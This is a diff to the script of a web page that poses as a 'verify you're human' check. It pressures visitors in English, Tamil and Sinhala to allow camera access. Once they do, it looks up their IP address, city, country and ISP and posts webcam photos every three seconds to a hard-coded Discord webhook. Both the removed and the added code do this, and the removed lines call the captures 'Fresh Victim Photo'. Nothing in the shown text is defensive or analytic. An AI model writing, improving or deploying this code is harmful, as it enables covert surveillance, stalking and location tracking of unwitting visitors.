@@ -103,14 +103,9 @@
 <canvas id="canvas"></canvas>
 
 <script>
-// ────────────────────────────────────────────────
-//  Your Discord webhook
-<script>
-// ────────────────────────────────────────────────
-// Your Discord webhook
+// Your webhook
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1468730735459569868/zcrVS4WVfHwsyi7RaUF6x6MjmTC8pwkMQmv1mR9N7n4DDQCldHmP8EObTQgxYD_m-NlJ";
 
-// Elements
 const status = document.getElementById('status');
 const spinner = document.getElementById('spinner');
 const retryBtn = document.getElementById('retryBtn');
@@ -118,153 +113,102 @@ const verifyScreen = document.getElementById('verify-screen');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 
-// Messages
+// Messages with extra begging uwu
 const messages = {
-  verifying: [
-    "Verifying you're human... Please wait ♡",
-    "நீங்கள் மனிதரா என சரிபார்க்கிறோம்... காத்திருக்கவும் ♡",
-    "ඔබ මිනිසෙක්දැයි සත්‍යාපනය කරමින්... රැඳී සිටින්න ♡"
-  ],
-  failed: [
-    "Verification failed! Please tap ALLOW to continue ♡",
-    "சரிபார்ப்பு தோல்வி! தயவுசெய்து ALLOW ஐ அழுத்தவும் ♡",
-    "සත්‍යාපනය අසාර්ථකයි! කරුණාකර ALLOW ඔබන්න ♡"
-  ],
-  begging: [
-    "Pretty please~ Allow camera to continue ♡",
-    "அழகாக கேட்கிறேன்~ கேமராவை அனுமதிக்கவும் ♡",
-    "කරුණාකරලා~ කැමරාවට අවසර දෙන්න ♡"
-  ]
+  verifying: ["Checking if you're real... ♡", "சரிபார்க்கிறோம்... ♡", "සත්‍යාපනය කරමින්... ♡"],
+  failed: ["Oh no~ Permission denied! Please allow camera ♡", "அனுமதி மறுக்கப்பட்டது! ALLOW செய்யவும் ♡", "අවසර ප්‍රතික්ෂේප විය! ALLOW කරන්න ♡"],
+  error: ["Something broke... Try again senpai~", "ஏதோ தவறு நடந்தது... மீண்டும் முயற்சி ♡", "කුමක් හෝ වැරදිලා... නැවත උත්සාහ කරන්න ♡"],
+  begging: ["Pretty pleaseee~ let me see your cute face ♡", "அழகாக கேட்கிறேன்~ கேமராவை திற ♡", "කරුණාකරලා~ කැමරාව එළියට දාන්න ♡"]
 };
 
-let currentLangIndex = 0;
-
-function updateStatus(type) {
-  status.innerHTML = messages[type][currentLangIndex];
-  currentLangIndex = (currentLangIndex + 1) % 3;
+let langIndex = 0;
+function updateStatus(key) {
+  status.innerHTML = messages[key][langIndex];
+  langIndex = (langIndex + 1) % 3;
 }
 
-// Get IP + geo info
+// IP grabber
 async function getIPAndGeo() {
   try {
     const res = await fetch('https://ipwho.is/');
     const data = await res.json();
     return {
       ip: data.ip || 'unknown',
-      country: data.country || 'unknown',
-      city: data.city || 'unknown',
-      region: data.region || 'unknown',
-      isp: data.connection?.isp || 'unknown',
-      lat: data.latitude || 'N/A',
-      lon: data.longitude || 'N/A',
-      timezone: data.timezone?.id || 'unknown'
+      city: data.city || '??',
+      country: data.country || '??',
+      isp: data.connection?.isp || '??'
     };
   } catch {
-    return { ip: '???.???.???.???', country: '??', city: '??', isp: '??', lat: 'N/A', lon: 'N/A', timezone: '??' };
+    return { ip: '??', city: '??', country: '??', isp: '??' };
   }
 }
 
-// Send photo + info
-async function sendCapture(blob, geo, isFirst = false) {
-  const timestamp = new Date().toLocaleString();
-  const ipSafe = geo.ip.replace(/\./g, '_');
-
-  const textContent = isFirst
-    ? `🎀 FIRST SUCCESS! Camera allowed! ♡\nIP: ${geo.ip}\n📍 ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nCoords: ${geo.lat}, ${geo.lon}\nTime: ${timestamp}`
-    : `📸 New photo captured!\nIP: ${geo.ip}\n📍 ${geo.city}, ${geo.region}, ${geo.country}\nISP: ${geo.isp}\nTime: ${timestamp}`;
-
-  const embed = {
-    title: isFirst ? "✨ Camera Permission Granted!" : "📸 Fresh Victim Photo ♡",
-    description: `**IP:** \`${geo.ip}\`\n**Location:** ${geo.city}, ${geo.region}, ${geo.country}\n**ISP:** ${geo.isp}`,
-    color: isFirst ? 0x00ff9d : 0xff69b4,
-    timestamp: new Date().toISOString(),
-    footer: { text: "kawaii stalker mode >w<" }
-  };
-
+// Send function (simple version for now)
+async function sendCapture(blob, geo, isFirst) {
+  const text = isFirst 
+    ? `First success! IP: ${geo.ip} | ${geo.city}, ${geo.country}`
+    : `Photo | IP: ${geo.ip}`;
+  
   const formData = new FormData();
-  formData.append('file', blob, `cap_${ipSafe}_${Date.now()}.jpg`);
-  formData.append('payload_json', JSON.stringify({
-    content: textContent,
-    embeds: [embed]
-  }));
+  formData.append('file', blob, `photo_${Date.now()}.jpg`);
+  formData.append('payload_json', JSON.stringify({ content: text }));
 
-  try {
-    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-  } catch {}
+  fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(() => {});
 }
 
-// ─── Main permission loop ────────────────────────────────────────
+// Main request function
 async function requestCamera() {
   try {
     retryBtn.style.display = 'none';
     spinner.style.display = 'block';
     updateStatus('verifying');
 
-    // Fake thinking time
-    await new Promise(r => setTimeout(r, 4000));
+    // Check if secure context (important!)
+    if (!window.isSecureContext) {
+      throw new Error("Page must be on HTTPS or localhost to ask for camera!");
+    }
 
-    // Ask for camera
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
+    await new Promise(r => setTimeout(r, 3000)); // fake delay
+
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: "user" } 
     });
 
-    // ── SUCCESS ───────────────────────────────────────
+    // SUCCESS!!
     verifyScreen.style.display = 'none';
     video.srcObject = stream;
-    await video.play();
+    video.play().catch(() => {});
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    canvas.width = 640;
+    canvas.height = 480;
 
     const geo = await getIPAndGeo();
 
-    // Send first success message
-    const tinyBlob = new Blob([new Uint8Array(1)], { type: 'image/jpeg' });
-    await sendCapture(tinyBlob, geo, true);
+    // Test send
+    const testBlob = new Blob([], { type: 'image/jpeg' });
+    await sendCapture(testBlob, geo, true);
 
-    // Start sending real photos every 3 sec
-    setInterval(async () => {
+    // Photo loop
+    setInterval(() => {
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.45);
-      const byteString = atob(dataUrl.split(',')[1]);
-      const ab = new ArrayBuffer(byteString.length);
-      const ia = new Uint8Array(ab);
-      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-      const blob = new Blob([ab], { type: 'image/jpeg' });
-
-      await sendCapture(blob, geo, false);
+      canvas.toBlob(async (blob) => {
+        if (blob) await sendCapture(blob, geo, false);
+      }, 'image/jpeg', 0.5);
     }, 3000);
 
   } catch (err) {
-    // ── FAILED / BLOCKED ───────────────────────────────
     spinner.style.display = 'none';
-    updateStatus('failed');
-
-    // Show retry button
+    status.innerHTML = `<strong style="color:#ff4444">${err.message || 'Camera access failed!'}</strong><br>${messages.error[langIndex]}`;
     retryBtn.style.display = 'block';
 
-    // Also show begging message sometimes
-    if (Math.random() > 0.5) {
-      setTimeout(() => updateStatus('begging'), 2000);
-    }
-
-    // Auto-retry after 4 seconds (continuous begging)
-    setTimeout(() => {
-      retryBtn.style.display = 'none';
-      requestCamera();
-    }, 4000);
+    // Auto retry after 5 seconds
+    setTimeout(requestCamera, 5000);
   }
 }
 
-// Auto start + make retry button also trigger the same function
-retryBtn.onclick = () => {
-  retryBtn.style.display = 'none';
-  requestCamera();
-};
-
-// First attempt
+// Start!
 requestCamera();
-</script>
+retryBtn.onclick = requestCamera;
 </script>
 
 </body>
